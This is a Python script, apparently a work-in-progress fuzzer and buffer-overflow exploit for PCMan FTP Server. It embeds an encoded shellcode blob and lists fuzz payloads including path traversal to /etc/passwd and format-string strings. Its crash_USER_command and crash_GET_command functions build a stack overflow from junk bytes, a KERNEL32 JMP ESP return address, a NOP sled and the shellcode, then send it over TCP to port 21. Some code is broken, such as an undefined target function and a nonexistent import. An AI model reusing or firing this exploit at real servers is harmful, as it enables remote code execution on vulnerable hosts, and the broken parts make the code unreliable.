#!/usr/bin/env python
import sys
import random
from datetime import datetime
import os
import signal
import subprocess
from socket import *
from sys import exit, exc_info
from time import sleep
from subprocess import Popen, PIPE, STDOUT
import requests
import urlparse3


def get_shellcode():
    shellcode = "\xdb\xcc\xba\x40\xb6\x7d\xba\xd9\x74\x24\xf4\x58\x29\xc9"
    shellcode += "\xb1\x50\x31\x50\x18\x03\x50\x18\x83\xe8\xbc\x54\x88\x46"
    shellcode += "\x56\x72\x3e\x5f\x5f\x7b\x3e\x60\xff\x0f\xad\xbb\xdb\x84"
    shellcode += "\x6b\xf8\xa8\xe7\x76\x78\xaf\xf8\xf2\x37\xb7\x8d\x5a\xe8"
    shellcode += "\xc6\x7a\x2d\x63\xfc\xf7\xaf\x9d\xcd\xc7\x29\xcd\xa9\x08"
    shellcode += "\x3d\x09\x70\x42\xb3\x14\xb0\xb8\x38\x2d\x60\x1b\xe9\x27"
    shellcode += "\x6d\xe8\xb6\xe3\x6c\x04\x2e\x67\x62\x91\x24\x28\x66\x24"
    shellcode += "\xd0\xd4\xba\xad\xaf\xb7\xe6\xad\xce\x84\xd7\x16\x74\x80"
    shellcode += "\x54\x99\xfe\xd6\x56\x52\x70\xcb\xcb\xef\x31\xfb\x4d\x98"
    shellcode += "\x3f\xb5\x7f\xb4\x10\xb5\xa9\x22\xc2\x2f\x3d\x98\xd6\xc7"
    shellcode += "\xca\xad\x24\x47\x60\xad\x99\x1f\x43\xbc\xe6\xdb\x03\xc0"
    shellcode += "\xc1\x43\x2a\xdb\x88\xfa\xc1\x2c\x57\xa8\x73\x2f\xa8\x82"
    shellcode += "\xeb\xf6\x5f\xd6\x46\x5f\x9f\xce\xcb\x33\x0c\xbc\xb8\xf0"
    shellcode += "\xe1\x01\x6d\x08\xd5\xe0\xf9\xe7\x8a\x8a\xaa\x8e\xd2\xc6"
    shellcode += "\x24\x35\x0e\x99\x73\x62\xd0\x8f\x11\x9d\x7f\x65\x1a\x4d"
    shellcode += "\x17\x21\x49\x40\x01\x7e\x6e\x4b\x82\xd4\x6f\xa4\x4d\x32"
    shellcode += "\xc6\xc3\xc7\xeb\x27\x1d\x87\x47\x83\xf7\xd7\xb8\xb8\x90"
    shellcode += "\xc0\x40\x78\x19\x58\x4c\x52\x8f\x99\x62\x3c\x5a\x02\xe5"
    shellcode += "\xa8\xf9\xa7\x60\xcd\x94\x67\x2a\x24\xa5\x01\x2b\x5c\x71"
    shellcode += "\x9b\x56\x91\xb9\x68\x3c\x2f\x7b\xa2\xbf\x8d\x50\x2f\xb2"
    shellcode += "\x6b\x91\xe4\x66\x20\x89\x88\x86\x85\x5c\x92\x02\xad\x9f"
    shellcode += "\xba\xb6\x7a\x32\x12\x18\xd5\xd8\x95\xcb\x84\x49\xc7\x14"
    shellcode += "\xf6\x1a\x4a\x33\xf3\x14\xc7\x3b\x2d\xc2\x17\x3c\xe6\xec"
    shellcode += "\x38\x48\x5f\xef\x3a\x8b\x3b\xf0\xeb\x46\x3c\xde\x7c\x88"
    shellcode += "\x0c\x3f\x1c\x05\x6f\x16\x22\x79"
    return shellcode


def mutate(s):
    """Return s with a random mutation applied"""
    mutators = [
        delete_random_character,
        insert_random_character,
        flip_random_character
    ]
    mutator = random.choice(mutators)
    # print(mutator)
    return mutator(s)


class FuzzedStringContainer:
    def __init__(self, inp, mutations):
        self.inp = inp
        self.fuzzable = "true"
        self.crashes = 4  # after 4 crashes, there s no need to fuzz anymore
        self.fuzzed_container = []
        self.mutations = 2

    def __append__(self, s):
        self.fuzzed_container.append(s)

    def get_container(self):
        return self.fuzzed_container

    def fuzz_all(self):
        self.fuzzed_container.append(Mutation(self.inp, self.mutations))
        for i in fuzz_potentials(self.inp):
            self.fuzzed_container.append(i)


def add_long_strings(s, container):
    if s == "":
        return s
    for length in [128, 255, 256, 257, 511, 512, 513, 1023, 1024, 2048, 2049, 4095, 4096, 4097, 5000, 10000, 20000,
                   32762, 32763, 32764, 32765, 32766, 32767, 32768, 32769, 0xFFFF - 2, 0xFFFF - 1, 0xFFFF, 0xFFFF + 1,
                   0xFFFF + 2, 99999, 100000, 500000]:
        long_string = str(s * length)
        print(long_string)
        container.__append__(long_string)
    return container


def flip_random_character(s):
    """Returns s with a random bit flipped in a random position"""
    if s == "":
        return s

    pos = random.randint(0, len(s) - 1)
    c = s[pos]
    bit = 1 << random.randint(0, 6)
    new_c = chr(ord(c) ^ bit)
    return s[:pos] + new_c + s[pos + 1:]


def insert_random_character(s):
    """Returns s with a random character inserted"""
    if s == "":
        return s
    pos = random.randint(0, len(s))
    random_character = chr(random.randrange(32, 127))
    # print("Inserting", repr(random_character), "at", pos)
    return s[:pos] + random_character + s[pos:]


def delete_random_character(s):
    """Returns s with a random character deleted"""
    if s == "":
        return s

    pos = random.randint(0, len(s) - 1)
    # print("Deleting", repr(s[pos]), "at", pos)
    return s[:pos] + s[pos + 1:]


def overflow_fuzz(s):
    if s == "":
        return s

def fuzz_potentials(s):
    container = ["/.:/" + "A" * 5000 + "\x00\x00"+get_shellcode(),
                 "/.../" + "A" * 5000 + "\x00\x00",
                 "/.../.../.../.../.../.../.../.../.../.../",
                 "/../../../../../../../../../../../../etc/passwd",
                 "/../../../../../../../../../../../../boot.ini",
                 "..:..:..:..:..:..:..:..:..:..:..:..:..:",
                 "\\\\*",
                 "\\\\?\\",
                 "/\\" * 5000,
                 "/." * 5000,
                 "!@#$%%^#$%#$@#$%$$@#$%^^**(()",
                 "%01%02%03%04%0a%0d%0aADSF",
                 "%01%02%03@%04%0a%0d%0aADSF",
                 "/%00/",
                 "%00/",
                 "%00",
                 "%u0000",
                 "%\xfe\xf0%\x00\xff",
                 "%\xfe\xf0%\x01\xff" * 20,

                 # format strings.
                 "%n" * 100,
                 "%n" * 500,
                 "\"%n\"" * 500,
                 "%s" * 100,
                 "%s" * 500,
                 "\"%s\"" * 500,

                 # some binary strings.
                 "\xde\xad\xbe\xef",
                 "\xde\xad\xbe\xef" * 10,
                 "\xde\xad\xbe\xef" * 100,
                 "\xde\xad\xbe\xef" * 1000,
                 "\xde\xad\xbe\xef" * 10000,
                 "\x00" * 1000,

                 "\r\n" * 100,
                 "<>" * 500,
                 ]
    results = []
    MultipleMut = MultipleMutation(2, 20)
    for i in container:
        results.append(repr(s + i))
        results.append(s + str(MultipleMut.fuzz(i, 10)))
        # results.append(repr(s + i*2))
        # results.append(repr(s + i*10))
    # results.append(s+str(MultipleMut.fuzz(get_shellcode(), 10))+rand_string(100))
    results.append(s + str(MultipleMut.fuzz(get_shellcode(), 10)))
    return results


def rand_string(max_length=100, char_start=32, char_range=32):
    """A string of up to `max_length` characters
       in the range [`char_start`, `char_start` + `char_range`]"""
    string_length = random.randrange(50, max_length + 1)
    out = ""
    for i in range(0, string_length):
        out += chr(random.randrange(char_start, char_start + char_range))
    return repr(out)


# class responsable to range the mutaitons, and the mutation evolution, saving the original content
class MultipleMutation:
    def __init__(self, min_mutations, max_mutations):
        self.min_mutations = min_mutations
        self.max_mutations = max_mutations
        self.seed = ""  # we need to save the original value of the string we want to
        self.fuzzed = ""

    def fuzz(self, value_inp, mutations):
        self.seed += value_inp
        if mutations > self.max_mutations or mutations < self.min_mutations:
            print("Mutation number out of range")
            return
        for _ in range(mutations):
            value_inp = mutate(value_inp)
        self.fuzzed += value_inp

    def print_results(self):
        print("original: " + repr(self.seed) + "\nmodified: " + repr(self.fuzzed))

    def reset(self):
        self.seed = ""
        self.fuzzed = ""


# Function who gets the input and number of mutations as argument
# and returns the fuzzed string.

def get_parsedUrl(url):
    if url == "":
        return url

    try:
        result = urlparse3.parse_url(url)
    except Exception as e:
        print(e)


# take a string or list of string and return the string
def Mutation(inp, mutations):
    MultObject = MultipleMutation(2, 10)
    MultObject.fuzz(inp, mutations)
    fuzzed_str = MultObject.fuzzed
    # MultObject.print_results()
    MultObject.reset()  # reseting the buffers where content is stored
    # print(repr(fuzzed_str))
    return repr(fuzzed_str)


def sigHandle(signum, frm):  # Signal handler

    print("\n Cleaning up the exploit... [!!!]\n")
    sleep(1)
    exit(0)


# overflow user command
# FTP allows us to write commands into a file
# Subprocess allows us to run cmd commands
# TODO:  See the function im working atm  better


def Send_Socket(sploit):
    victim = targServer()
    port = int(21)
    try:
        print("\n"" Creating network socket.")
        net_sock = socket(AF_INET, SOCK_STREAM)
        net_sock.settimeout(4)
    except:
        print(("\nThere was an error creating the network socket. \n\n%s\n" % exc_info()))
        sleep(1)
        exit(0)

    try:
        print(("  Connecting to PCMan FTP Server @ %s on port TCP/%d." % (victim, port)))
        net_sock.connect((victim, port))
    except:
        print(("\n There was an error connecting to %s. \n\n%s\n" % (victim, exc_info())))
        sleep(1)
        return -1

    try:
        print("Attempting to exploit the FTP  servers.")
        net_sock.send(sploit.encode())
        print("Crash attempt finished!")
        sleep(0.1)
    except:
        print(("\n There was an error sending the exploit to %s \n\n%s\n" % (victim, exc_info())))
        sleep(1)
        exit(0)
        return -1

    try:
        net_sock.close()
    except:
        print(("\n  There was an error closing the network socket. n\n%s\n" % exc_info()))
    return 1


def SendThroughCmd():
    return


def Overflow_FTP_Server():
    file = open("data.txt", "w")
    conn = "open 192.168.216.140"
    password = "pass"
    with open("sploit.txt", "r") as ff:
        spl = ff.read()
    # cmd = "USER " #static variable
    user = "anonymous"  # we try to fuzz this
    fuzzed = FuzzedStringContainer(user, 3)
    fuzzed.fuzz_all()
    # cont = fuzzed.get_container()

    for i in fuzzed.get_container():
        sploit = conn + repr(i) + '\n' + password + '\n'
        file.write(sploit)
        # print("sending mutated daata to fpt server: ")
        if Send_Socket(sploit) == -1:
            logger = open("crashbin", "w")
            sleep(0.1)
            Time_now = datetime.now()
            timeString = str(Time_now)
            MutatedString = str(i)
            logger.write(timeString + "\t\t" + MutatedString + "String has crashed the ftp server\n")
            # print("Mutated string" + repr(i) + "\n")
            logger.close()



def fuzzing_http_requests(url, exploit):  # exploit being the executable
    # TODO: Find API vulnerable to GET requests and send fuzzed urls
    FTP_Server = "USER "
    proc = subprocess.run(exploit)
    for _ in range(20):
        url_fuzzed = Mutation(url, 10)
        requests.get(url, url_fuzzed)
    subprocess.run(exploit)


def crash_GET_command():
    user_data = "USER anonymous\n"
    password = "Password test1234\n"
    cmd = "RETR"
    junk = "\x42" * 2004
    # JMP ESP
    ret = "\x65\x82\xA5\x7C"
    NOP = "\x90" * 50
    sploit = user_data + password + cmd + junk + ret + NOP + get_shellcode()
    # little_sploit = user_data + password + cmd + junk
    sploit += "\x42" * (2992 - len(NOP + get_shellcode())) + "\r\n"
    Send_Socket(sploit)
    # Send_Socket(little_splioit)


def crash_USER_command():
    Cmd = "USER "  # Vulnerable command
    junk = "\x42" * 2004
    # KERNEL32.dll 7CA58265 - JMP ESP
    ret = "\x65\x82\xA5\x7C"
    NOP = "\x90" * 50

    sploit = Cmd + junk + ret + NOP + get_shellcode()
    sploit += "\x42" * (2992 - len(NOP + get_shellcode())) + "\r\n"
    with open("sploit.txt", "w") as f:
        f.write(str(sploit.encode()))
    Send_Socket(sploit)
